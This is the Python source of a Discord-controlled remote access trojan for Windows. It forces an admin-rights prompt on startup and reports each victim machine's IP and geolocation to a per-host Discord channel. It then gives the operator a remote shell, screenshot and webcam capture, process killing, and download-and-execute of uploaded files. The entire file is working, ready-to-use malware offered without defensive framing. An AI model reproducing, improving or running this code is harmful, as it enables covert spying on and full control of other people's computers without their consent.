import discord
import socket
import asyncio
import subprocess
import datetime
import json
import ctypes
import sys
import urllib.request
import urllib.parse
import winreg
import pytz
from discord import Embed
from discord.ui import Button, View
from PIL import ImageGrab
import os
import webbrowser
import cv2

# Settings
MAINCHANNEL = YOUR_CHANNEL_ID
DISCORDTOKEN = "YOUR_BOT_TOKEN"


# Check and request admin privileges
def check_admin():
    """Check if script is running as admin, if not request admin privileges"""
    try:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
    except:
        is_admin = False
    
    if not is_admin:
        print("[DEBUG] Requesting administrator privileges...")
        # Re-run the script with admin privileges
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        print("[DEBUG] Script restarting with admin privileges, exiting current instance...")
        sys.exit()
    else:
        print("[DEBUG] Script is running with administrator privileges")

# Request admin privileges on startup
check_admin()

intents = discord.Intents.default()
intents.messages = True
intents.message_content = True

client = discord.Client(intents=intents)

# Country to flag emoji mapping
COUNTRY_FLAGS = {
    'United States': '🇺🇸', 'Canada': '🇨🇦', 'Mexico': '🇲🇽', 'United Kingdom': '🇬🇧', 'France': '🇫🇷',
    'Germany': '🇩🇪', 'Italy': '🇮🇹', 'Spain': '🇪🇸', 'Portugal': '🇵🇹', 'Netherlands': '🇳🇱',
    'Belgium': '🇧🇪', 'Switzerland': '🇨🇭', 'Austria': '🇦🇹', 'Poland': '🇵🇱', 'Sweden': '🇸🇪',
    'Norway': '🇳🇴', 'Denmark': '🇩🇰', 'Finland': '🇫🇮', 'Russia': '🇷🇺', 'Ukraine': '🇺🇦',
    'Japan': '🇯🇵', 'South Korea': '🇰🇷', 'China': '🇨🇳', 'India': '🇮🇳', 'Australia': '🇦🇺',
    'New Zealand': '🇳🇿', 'Brazil': '🇧🇷', 'Argentina': '🇦🇷', 'Chile': '🇨🇱', 'Colombia': '🇨🇴',
    'United Arab Emirates': '🇦🇪', 'Saudi Arabia': '🇸🇦', 'Israel': '🇮🇱', 'Singapore': '🇸🇬',
    'Hong Kong': '🇭🇰', 'Thailand': '🇹🇭', 'Vietnam': '🇻🇳', 'Philippines': '🇵🇭',
    'Malaysia': '🇲🇾', 'Indonesia': '🇮🇩', 'South Africa': '🇿🇦', 'Egypt': '🇪🇬',
    'Turkey': '🇹🇷', 'Greece': '🇬🇷', 'Ireland': '🇮🇪', 'Iceland': '🇮🇸',
    'Pakistan': '🇵🇰', 'Bangladesh': '🇧🇩', 'Taiwan': '🇹🇼',
    'Iran': '🇮🇷', 'Iraq': '🇮🇶', 'Syria': '🇸🇾', 'Lebanon': '🇱🇧',
    'Kenya': '🇰🇪', 'Nigeria': '🇳🇬', 'Ghana': '🇬🇭', 'Morocco': '🇲🇦',
    'Czech Republic': '🇨🇿', 'Hungary': '🇭🇺', 'Romania': '🇷🇴', 'Bulgaria': '🇧🇬',
    'Croatia': '🇭🇷', 'Serbia': '🇷🇸', 'Slovenia': '🇸🇮', 'Slovakia': '🇸🇰',
    'Lithuania': '🇱🇹', 'Latvia': '🇱🇻', 'Estonia': '🇪🇪', 'Belarus': '🇧🇾',
}

def get_country_flag(country):
    """Get flag emoji for a country. Returns flag or default if not found."""
    flag = COUNTRY_FLAGS.get(country)
    if flag:
        return flag
    return '🌍'

# Helper functions for consistent embed styling
def create_success_embed(message: str):
    """Create a standardized success embed (green with ✓)"""
    return Embed(title='✓ Success', description=message, color=0x00ff00)

def create_error_embed(message: str):
    """Create a standardized error embed (red with ✗)"""
    return Embed(title='✗ Error', description=message, color=0xff0000)

def create_info_embed(title: str, message: str):
    """Create a standardized info embed (blue)"""
    return Embed(title=title, description=message, color=0x0000ff)

def create_warning_embed(message: str):
    """Create a standardized warning embed (yellow)"""
    return Embed(title='⚠ Warning', description=message, color=0xffff00)

# Global variable to track shell mode
shell_mode = False
pc_channel_id = None
status_message = None
animation_frames = ['/', '\\']
current_frame = 0
waiting_for_popup = False
waiting_for_site = False
waiting_for_bg = False
waiting_for_run = False
waiting_for_screenflip = False
geo_data_cache = None  # Cache geolocation data

AVAILABLE_COMMANDS = '`/shell` - Activate shell mode\n`/exit` - Deactivate shell mode\n`/screenshot` - Take a screenshot\n`/webpic` - Capture webcam image\n`/clear` - Clear channel\n`/popup` - Show popup message\n`/opensite` - Open a website (asks for URL)\n`/tasklist` - Show active tasks with kill buttons\n`/geo` - Get device geolocation\n`/backround` - Set device background (upload image)\n`/screenflip` - Rotate screen (normal, right, left, or reverse)\n`/run` - Run/execute any uploaded file\n`/help` - Show help'

@client.event
async def on_ready():
    global pc_channel_id
    print(f"[DEBUG] Client connected as {client.user}")
    print(f"[DEBUG] Bot is ready and listening for messages")

    # Get PC name and local IP
    pc_name = socket.gethostname()
    print(f"[DEBUG] PC Name: {pc_name}")
    try:
        ip_address = socket.gethostbyname(socket.gethostname())
    except:
        ip_address = "Unknown"
    print(f"[DEBUG] IP Address: {ip_address}")

    # Get the main channel and its guild
    main_channel = client.get_channel(MAINCHANNEL)
    guild = main_channel.guild
    print(f"[DEBUG] Guild: {guild.name}")
    print(f"[DEBUG] Main Channel: {main_channel.name}")

    # List all channels on the server
    print(f"[DEBUG] All channels on server:")
    for channel in guild.text_channels:
        print(f"[DEBUG]   - {channel.name} (ID: {channel.id})")

    # Look for existing channel with the PC name (converted to lowercase)
    pc_channel = None
    pc_name_lower = pc_name.lower()
    print(f"[DEBUG] Searching for channel with name: {pc_name_lower}")
    for channel in guild.text_channels:
        if channel.name == pc_name_lower:
            pc_channel = channel
            print(f"[DEBUG] Found existing channel: {pc_name_lower}")
            # Clear all messages from the channel
            print(f"[DEBUG] Clearing messages from channel...")
            async for message in pc_channel.history(limit=None):
                await message.delete()
            print(f"[DEBUG] Cleared all messages from channel: {pc_name_lower}")
            break

    # Create a new channel only if it doesn't exist
    if pc_channel is None:
        print(f"[DEBUG] Channel does not exist, creating new channel: {pc_name_lower}")
        pc_channel = await guild.create_text_channel(name=pc_name_lower)
        print(f"[DEBUG] Created new channel: {pc_name_lower}")

    pc_channel_id = pc_channel.id
    print(f"[DEBUG] PC Channel ID: {pc_channel_id}")

    # Get geolocation data
    print(f"[DEBUG] Fetching geolocation data...")
    global geo_data_cache
    try:
        ip_response = urllib.request.urlopen('https://api.ipify.org?format=json', timeout=5)
        ip_data = json.loads(ip_response.read().decode())
        public_ip = ip_data.get('ip')
        print(f"[DEBUG] Public IP: {public_ip}")
        
        geo_url = f'http://ip-api.com/json/{public_ip}'
        geo_response = urllib.request.urlopen(geo_url, timeout=5)
        geo_data_cache = json.loads(geo_response.read().decode())
        print(f"[DEBUG] Geolocation: {geo_data_cache.get('country', 'N/A')}")
    except Exception as e:
        print(f"[DEBUG] Error fetching geolocation: {e}")
        geo_data_cache = {}

    # Send connection notification to PC channel
    print(f"[DEBUG] Sending connection notification to PC channel...")
    global status_message
    pc_embed = Embed(title=f'{animation_frames[0]} Client Connected', color=0x00ff00)
    pc_embed.add_field(name='IP', value=ip_address, inline=False)
    pc_embed.add_field(name='Name', value=pc_name, inline=False)
    
    # Add country info with flag
    if geo_data_cache and geo_data_cache.get('status') == 'success':
        country = geo_data_cache.get('country', 'Unknown')
        country_flag = get_country_flag(country)
        pc_embed.add_field(name='Country', value=f"{country_flag} {country}", inline=False)
    
    pc_embed.add_field(name='Available Commands', value=AVAILABLE_COMMANDS, inline=False)
    status_message = await pc_channel.send(embed=pc_embed)
    print(f"[DEBUG] Connection complete!")
    
    # Start the animation task
    print(f"[DEBUG] Starting animation task...")
    client.loop.create_task(animate_status(status_message, pc_name, ip_address))

# Animation function to update the status message
async def animate_status(message, pc_name, ip_address):
    frame = 0
    try:
        while True:
            await asyncio.sleep(1)  # Update every 1 second
            pc_embed = Embed(title=f'{animation_frames[frame]} Client Connected', color=0x00ff00)
            pc_embed.add_field(name='IP', value=ip_address, inline=False)
            pc_embed.add_field(name='Name', value=pc_name, inline=False)
            
            # Add country info with flag
            if geo_data_cache and geo_data_cache.get('status') == 'success':
                country = geo_data_cache.get('country', 'Unknown')
                country_flag = get_country_flag(country)
                pc_embed.add_field(name='Country', value=f"{country_flag} {country}", inline=False)
            
            pc_embed.add_field(name='Available Commands', value=AVAILABLE_COMMANDS, inline=False)
            await message.edit(embed=pc_embed)
            frame = (frame + 1) % len(animation_frames)
    except Exception as e:
        print(f"[DEBUG] Animation task error: {e}")

# Helper function to set window to topmost priority
async def set_window_topmost():
    """Set the foreground window to topmost priority"""
    try:
        await asyncio.sleep(0.3)  # Give window time to appear
        HWND_TOPMOST = -1
        SWP_NOSIZE = 0x0001
        SWP_NOMOVE = 0x0002
        SWP_NOACTIVATE = 0x0010
        
        # Get the foreground window
        hwnd = ctypes.windll.user32.GetForegroundWindow()
        if hwnd:
            ctypes.windll.user32.SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE | SWP_NOACTIVATE)
            print(f"[DEBUG] Window set to topmost priority")
    except Exception as e:
        print(f"[DEBUG] Could not set window to topmost: {e}")

# Function to execute shell commands with timeout and size limit
async def execute_command(command):
    print(f"[DEBUG] Executing command: {command}")
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10)
        output = result.stdout.strip()
        
        # Truncate output to 1500 chars to avoid exceeding Discord's 6000 char embed limit
        if len(output) > 1500:
            output = output[-1500:] + '\n... (output truncated)'
        
        print(f"[DEBUG] Command output: {output[:100]}...")
        return output
    except subprocess.TimeoutExpired:
        print(f"[DEBUG] Command timed out")
        return "Command timed out after 10 seconds"
    except Exception as e:
        print(f"[DEBUG] Command execution error: {e}")
        return f"Error executing command: {str(e)}"

@client.event
async def on_message(message):
    global shell_mode
    print(f"[DEBUG] Message received from {message.author}: {message.content}")
    if message.channel.id == pc_channel_id and message.author != client.user:
        print(f"[DEBUG] Message in PC channel, shell_mode: {shell_mode}")
        if message.content == '/shell':
            shell_mode = True
            print(f"[DEBUG] Shell mode activated")
            embed = create_success_embed("Shell mode activated.")
            await message.channel.send(embed=embed, delete_after=3)
            await message.delete()
        elif message.content == '/exit':
            shell_mode = False
            print(f"[DEBUG] Shell mode deactivated")
            embed = create_warning_embed("Shell mode deactivated.")
            await message.channel.send(embed=embed, delete_after=3)
            await message.delete()
        elif message.content == '/screenshot':
            print(f"[DEBUG] Screenshot command received")
            try:
                screenshot = ImageGrab.grab()
                screenshot_path = "screenshot.png"
                screenshot.save(screenshot_path)
                print(f"[DEBUG] Screenshot saved to {screenshot_path}")
                await message.channel.send(file=discord.File(screenshot_path))
                os.remove(screenshot_path)
                print(f"[DEBUG] Screenshot sent and deleted")
            except Exception as e:
                print(f"[DEBUG] Screenshot error: {e}")
                embed = create_error_embed(f'Screenshot failed: {str(e)}')
                await message.channel.send(embed=embed, delete_after=5)
            await message.delete()
        elif message.content == '/webpic':
            print(f"[DEBUG] Webpic command received")
            try:
                # Open webcam (0 is the default camera)
                cap = cv2.VideoCapture(0)
                if not cap.isOpened():
                    raise Exception("Could not open webcam")
                
                # Capture a single frame
                ret, frame = cap.read()
                cap.release()
                
                if not ret:
                    raise Exception("Failed to capture frame from webcam")
                
                # Save the frame as an image
                webcam_path = "webcam.png"
                cv2.imwrite(webcam_path, frame)
                print(f"[DEBUG] Webcam image saved to {webcam_path}")
                
                await message.channel.send(file=discord.File(webcam_path))
                os.remove(webcam_path)
                print(f"[DEBUG] Webcam image sent and deleted")
            except Exception as e:
                print(f"[DEBUG] Webpic error: {e}")
                embed = create_error_embed(f'Webcam capture failed: {str(e)}')
                await message.channel.send(embed=embed, delete_after=5)
            await message.delete()
        elif message.content == '/clear':
            print(f"[DEBUG] Clear command received")
            try:
                async for msg in message.channel.history(limit=None):
                    if msg.id != status_message.id:
                        await msg.delete()
                print(f"[DEBUG] Channel cleared (except system info)")
                embed = create_success_embed("Channel cleared.")
                await message.channel.send(embed=embed, delete_after=2)
            except Exception as e:
                print(f"[DEBUG] Clear error: {e}")
                embed = create_error_embed(f'Failed to clear channel: {str(e)}')
                await message.channel.send(embed=embed, delete_after=5)
            await message.delete()
        elif message.content == '/popup':
            global waiting_for_popup
            print(f"[DEBUG] Popup command received")
            waiting_for_popup = True
            embed = create_info_embed('Popup', 'Enter the message for the popup:')
            await message.channel.send(embed=embed, delete_after=30)
            await message.delete()
        elif message.content == '/tasklist':
            print(f"[DEBUG] Tasklist command received")
            try:
                # Use PowerShell to get processes with visible windows, excluding Settings
                ps_command = """Get-Process | Where-Object { 
                    $_.MainWindowTitle -and $_.MainWindowTitle -notlike '*Settings*'
                } | Select-Object ProcessName, MainWindowTitle, Id | ConvertTo-Json"""
                
                result = subprocess.run(['powershell', '-Command', ps_command], capture_output=True, text=True, timeout=5)
                
                if result.returncode == 0 and result.stdout.strip():
                    try:
                        # Parse JSON output
                        data = json.loads(result.stdout.strip())
                        # Handle both single object and array
                        if isinstance(data, dict):
                            data = [data]
                        tasks = [{'name': item['ProcessName'], 'title': item['MainWindowTitle'], 'pid': str(item['Id'])} for item in data]
                    except json.JSONDecodeError:
                        tasks = []
                else:
                    tasks = []
                
                # Create embed table with nicer formatting
                embed = Embed(title='Active Applications', color=0x0000ff)
                
                # Add tasks to embed (limit to 24 to stay under Discord limits)
                if tasks:
                    for i, task in enumerate(tasks[:24], 1):
                        embed.add_field(name=f"{i}. {task['title']}", value="‎", inline=False)
                else:
                    embed.description = "No active applications"
                
                if len(tasks) > 24:
                    embed.add_field(name="...", value=f"And {len(tasks) - 24} more applications", inline=False)
                
                # Create view with kill buttons
                view = View()
                for task in tasks[:24]:
                    btn = Button(label=f"Kill {task['name'][:20]}", style=discord.ButtonStyle.red)
                    
                    def make_kill_callback(pid, name, channel):
                        async def callback(interaction: discord.Interaction):
                            try:
                                pid_int = int(pid)
                                
                                # Kill process (script runs with admin privileges, so this will work)
                                result = subprocess.run(f'taskkill /PID {pid_int} /F', shell=True, capture_output=True, text=True)
                                
                                if result.returncode == 0:
                                    # Process killed successfully
                                    embed_public = create_success_embed(f'**{name}** (PID: {pid_int}) has been terminated')
                                    await channel.send(embed=embed_public, delete_after=5)
                                    await interaction.response.defer()
                                    print(f"[DEBUG] Successfully killed process {name} (PID: {pid_int})")
                                else:
                                    embed_public = create_error_embed(f'Failed to terminate {name}: {result.stderr.strip()}')
                                    await channel.send(embed=embed_public, delete_after=5)
                                    await interaction.response.defer()
                                    print(f"[DEBUG] Failed to kill process {name}: {result.stderr}")
                            except ValueError:
                                embed_public = create_error_embed('Invalid PID format')
                                await channel.send(embed=embed_public, delete_after=5)
                                await interaction.response.defer()
                            except Exception as e:
                                embed_public = create_error_embed(f'Failed to kill process: {str(e)}')
                                await channel.send(embed=embed_public, delete_after=5)
                                await interaction.response.defer()
                                print(f"[DEBUG] Error killing process {name}: {e}")
                        return callback
                    
                    btn.callback = make_kill_callback(task['pid'], task['name'], message.channel)
                    view.add_item(btn)
                
                await message.channel.send(embed=embed, view=view)
                print(f"[DEBUG] Task list sent")
            except subprocess.TimeoutExpired:
                print(f"[DEBUG] Tasklist command timed out")
                embed = create_error_embed('Task list command timed out')
                await message.channel.send(embed=embed, delete_after=5)
            except Exception as e:
                print(f"[DEBUG] Tasklist error: {e}")
                embed = create_error_embed(f'Failed to retrieve task list: {str(e)}')
                await message.channel.send(embed=embed, delete_after=5)
            await message.delete()
        elif message.content == '/geo':
            print(f"[DEBUG] Geo command received")
            try:
                # Get public IP address
                ip_response = urllib.request.urlopen('https://api.ipify.org?format=json', timeout=5)
                ip_data = json.loads(ip_response.read().decode())
                public_ip = ip_data.get('ip')
                print(f"[DEBUG] Public IP: {public_ip}")
                
                # Get geolocation data from ip-api.com
                geo_url = f'http://ip-api.com/json/{public_ip}'
                geo_response = urllib.request.urlopen(geo_url, timeout=5)
                geo_data = json.loads(geo_response.read().decode())
                
                if geo_data.get('status') == 'success':
                    # Get client's local time using timezone
                    timezone = geo_data.get('timezone', 'UTC')
                    try:
                        tz = pytz.timezone(timezone)
                        local_time = datetime.datetime.now(tz).strftime('%Y-%m-%d %H:%M:%S %Z')
                    except:
                        local_time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    
                    # Create location embed
                    location_embed = Embed(title='🌍 Device Location', color=0x0000ff)
                    
                    country = geo_data.get('country', 'N/A')
                    country_flag = get_country_flag(country)
                    location_embed.add_field(name='Country', value=f"{country_flag} {country}", inline=True)
                    location_embed.add_field(name='City', value=geo_data.get('city', 'N/A'), inline=True)
                    location_embed.add_field(name='Region', value=geo_data.get('regionName', 'N/A'), inline=True)
                    location_embed.add_field(name='ISP', value=geo_data.get('isp', 'N/A'), inline=False)
                    location_embed.add_field(name='Public IP', value=public_ip, inline=False)
                    location_embed.add_field(name='Local Time', value=local_time, inline=False)
                    location_embed.add_field(name='Coordinates', value=f"{geo_data.get('lat', 'N/A')}, {geo_data.get('lon', 'N/A')}", inline=False)
                    location_embed.add_field(name='Timezone', value=geo_data.get('timezone', 'N/A'), inline=False)
                    
                    await message.channel.send(embed=location_embed)
                    print(f"[DEBUG] Geolocation sent: {geo_data.get('city')}, {geo_data.get('country')}")
                else:
                    embed = create_error_embed('Could not retrieve geolocation data')
                    await message.channel.send(embed=embed, delete_after=5)
            except Exception as e:
                print(f"[DEBUG] Geo error: {e}")
                embed = create_error_embed(f'Geolocation failed: {str(e)}')
                await message.channel.send(embed=embed, delete_after=5)
            await message.delete()
        elif message.content == '/backround':
            global waiting_for_bg
            print(f"[DEBUG] Backround command received")
            waiting_for_bg = True
            embed = create_info_embed('Set Background', 'Upload an image to set as device background:')
            await message.channel.send(embed=embed, delete_after=30)
            await message.delete()
        elif waiting_for_bg and message.attachments:
            print(f"[DEBUG] Background image received")
            waiting_for_bg = False
            try:
                # Download the image
                attachment = message.attachments[0]
                allowed_extensions = ('.jpg', '.jpeg', '.png', '.bmp', '.gif')
                if not attachment.filename.lower().endswith(allowed_extensions):
                    embed = create_error_embed('Invalid file format. Please upload an image (jpg, png, bmp, or gif)')
                    await message.channel.send(embed=embed, delete_after=5)
                    await message.delete()
                    return
                
                # Save image to temp location
                bg_path = os.path.join(os.path.expanduser('~'), 'AppData', 'Local', 'Temp', 'discord_bg.jpg')
                await attachment.save(bg_path)
                print(f"[DEBUG] Background image saved to {bg_path}")
                
                # Set wallpaper registry settings for proper scaling (fit to screen without zoom)
                try:
                    reg_path = r'Control Panel\Desktop'
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(key, 'WallpaperStyle', 0, winreg.REG_SZ, '6')  # 6 = Fit
                    winreg.SetValueEx(key, 'TileWallpaper', 0, winreg.REG_SZ, '0')   # 0 = No tiling
                    winreg.CloseKey(key)
                    print(f"[DEBUG] Registry settings updated for proper scaling")
                except Exception as e:
                    print(f"[DEBUG] Warning: Could not update registry: {e}")
                
                # Set as wallpaper using Windows API
                SPI_SETDESKWALLPAPER = 20
                result = ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, bg_path, 3)
                
                if result:
                    embed = create_success_embed('Desktop background updated successfully (fit to screen)')
                    print(f"[DEBUG] Background set successfully with proper scaling")
                else:
                    embed = create_error_embed('Failed to set background')
                    print(f"[DEBUG] Failed to set background")
                
                await message.channel.send(embed=embed, delete_after=5)
            except Exception as e:
                print(f"[DEBUG] Background error: {e}")
                embed = create_error_embed(f'Background setting failed: {str(e)}')
                await message.channel.send(embed=embed, delete_after=5)
            await message.delete()
        elif message.content == '/run':
            global waiting_for_run
            print(f"[DEBUG] Run command received")
            waiting_for_run = True
            embed = create_info_embed('Run File', 'Upload any file to run/execute:')
            await message.channel.send(embed=embed, delete_after=30)
            await message.delete()
        elif waiting_for_run and message.attachments:
            print(f"[DEBUG] File received for execution")
            waiting_for_run = False
            try:
                # Download the file
                attachment = message.attachments[0]
                
                # Save file to Downloads folder
                downloads_path = os.path.join(os.path.expanduser('~'), 'Downloads')
                file_path = os.path.join(downloads_path, attachment.filename)
                await attachment.save(file_path)
                print(f"[DEBUG] File saved to {file_path}")
                
                # Execute/run the file using default handler
                try:
                    os.startfile(file_path)
                    # Set window to topmost priority
                    await set_window_topmost()
                    embed = create_success_embed(f'Executing: {attachment.filename}')
                    print(f"[DEBUG] File executed: {attachment.filename}")
                except Exception as e:
                    embed = create_error_embed(f'Failed to execute file: {str(e)}')
                    print(f"[DEBUG] Failed to execute file: {e}")
                
                await message.channel.send(embed=embed, delete_after=5)
            except Exception as e:
                print(f"[DEBUG] File execution error: {e}")
                embed = create_error_embed(f'File execution failed: {str(e)}')
                await message.channel.send(embed=embed, delete_after=5)
            await message.delete()
        elif message.content == '/screenflip':
            global waiting_for_screenflip
            print(f"[DEBUG] Screenflip command received")
            waiting_for_screenflip = True
            embed = create_info_embed('Screen Flip', 'Enter screen orientation (normal, right, left, or reverse):')
            await message.channel.send(embed=embed, delete_after=30)
            await message.delete()
        elif waiting_for_screenflip and not message.content.startswith('/'):
            print(f"[DEBUG] Screenflip orientation received: {message.content}")
            waiting_for_screenflip = False
            orientation = message.content.strip().lower()
            
            # Map text orientation to degrees
            orientation_map = {
                'normal': 0,
                'right': 90,
                'left': 270,
                'reverse': 180
            }
            
            # Validate orientation input
            if orientation not in orientation_map:
                embed = create_error_embed('Invalid orientation. Please enter: normal, right, left, or reverse')
                await message.channel.send(embed=embed, delete_after=5)
                await message.delete()
                return
            
            try:
                # Use rotatescreen library to rotate the display
                import rotatescreen
                
                # Get the primary display
                display = rotatescreen.get_primary_display()
                
                rotation_value = orientation_map[orientation]
                # Use the correct API - display.rotate_to(degrees)
                display.rotate_to(rotation_value)
                
                embed = create_success_embed(f'Screen rotated to {orientation}')
                print(f"[DEBUG] Screen rotated to {orientation}")
            except ImportError:
                print(f"[DEBUG] rotatescreen library not found")
                embed = create_error_embed('rotatescreen library not installed')
            except Exception as e:
                print(f"[DEBUG] Screenflip error: {e}")
                embed = create_error_embed(f'Failed to rotate screen: {str(e)}')
            
            await message.channel.send(embed=embed, delete_after=5)
            await message.delete()
        elif message.content == '/help':
            print(f"[DEBUG] Help command received")
            help_embed = Embed(title='Available Commands', color=0x00ff00)
            help_embed.add_field(name='Commands', value='`/shell` - Activate shell mode\n`/exit` - Deactivate shell mode\n`/screenshot` - Take a screenshot\n`/webpic` - Capture webcam image\n`/clear` - Clear channel\n`/popup` - Show popup message\n`/opensite` - Open a website (asks for URL)\n`/tasklist` - Show active tasks with kill buttons\n`/geo` - Get device geolocation\n`/backround` - Set device background (upload image)\n`/screenflip` - Rotate screen (normal, right, left, or reverse)\n`/run` - Run/execute any uploaded file\n`/help` - Show help', inline=False)
            await message.channel.send(embed=help_embed)
            await message.delete()
        elif message.content == '/opensite':
            global waiting_for_site
            print(f"[DEBUG] OpenSite command received")
            waiting_for_site = True
            embed = create_info_embed('Open Site', 'Enter URL (example.com):')
            await message.channel.send(embed=embed, delete_after=30)
            await message.delete()
        elif waiting_for_site and not message.content.startswith('/'):
            print(f"[DEBUG] OpenSite URL received: {message.content}")
            waiting_for_site = False
            url = message.content.strip()
            # Basic validation
            if ' ' in url or '.' not in url:
                embed = create_error_embed('Invalid URL format. Use domain like example.com')
                await message.channel.send(embed=embed, delete_after=5)
            else:
                if not url.startswith('http://') and not url.startswith('https://'):
                    url = 'http://' + url
                try:
                    webbrowser.open(url, new=2)
                    # Set window to topmost priority
                    await set_window_topmost()
                    embed = create_success_embed(f'Opened {url}')
                    await message.channel.send(embed=embed, delete_after=5)
                    print(f"[DEBUG] Opened URL: {url}")
                except Exception as e:
                    embed = create_error_embed(f'Failed to open URL: {str(e)}')
                    await message.channel.send(embed=embed, delete_after=5)
            await message.delete()
        elif waiting_for_popup and not message.content.startswith('/'):
            print(f"[DEBUG] Popup message received: {message.content}")
            waiting_for_popup = False
            popup_message = message.content
            try:
                # Combine multiple flags to ensure topmost priority
                MB_TOPMOST = 0x00040000      # MB_TOPMOST
                MB_SYSTEMMODAL = 0x00001000   # MB_SYSTEMMODAL - highest priority
                MB_OK = 0x00000000
                flags = MB_TOPMOST | MB_SYSTEMMODAL | MB_OK
                
                # Display the message box
                result = ctypes.windll.user32.MessageBoxW(0, popup_message, "Message", flags)
                print(f"[DEBUG] Popup displayed: {popup_message}")
                embed = create_success_embed('Popup displayed successfully!')
                await message.channel.send(embed=embed, delete_after=3)
            except Exception as e:
                print(f"[DEBUG] Popup error: {e}")
                embed = create_error_embed(f'Failed to display popup: {str(e)}')
                await message.channel.send(embed=embed, delete_after=5)
            await message.delete()
        elif shell_mode:
            command = message.content
            output = await execute_command(command)
            try:
                embed = create_info_embed('Command Output', output or "No output")
                await message.channel.send(embed=embed)  # Send the command output as an embed
            except Exception as e:
                print(f"[DEBUG] Error sending command output: {e}")
                # If output is still too large, send it in chunks
                if len(output) > 1500:
                    chunks = [output[i:i+1500] for i in range(0, len(output), 1500)]
                    for i, chunk in enumerate(chunks):
                        embed = create_info_embed(f'Command Output (Part {i+1}/{len(chunks)})', chunk)
                        await message.channel.send(embed=embed)
                else:
                    embed = create_error_embed(f'Error sending output: {str(e)}')
                    await message.channel.send(embed=embed, delete_after=5)
            await message.delete()
        elif message.content.startswith('/'):
            embed = create_error_embed(f'Unknown command: `{message.content}`')
            await message.channel.send(embed=embed, delete_after=5)
            await message.delete()

client.run(DISCORDTOKEN)

# if your reading this yes i did use ai to anotate and try fix bugs but id say 90% is written by me myself and I. (: 